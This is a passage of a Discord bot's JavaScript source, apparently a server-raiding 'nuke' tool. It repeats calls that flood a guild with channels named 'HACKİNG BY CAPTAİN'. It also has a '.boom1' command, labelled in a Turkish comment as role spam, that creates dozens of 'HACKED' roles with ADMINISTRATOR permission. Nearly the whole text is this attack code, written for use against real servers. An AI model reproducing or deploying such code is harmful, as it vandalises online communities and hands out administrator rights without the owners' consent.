      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
  
  }   
});

 

    client.on("message", msg => {
  if (msg.content === ".boom1") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    }); msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
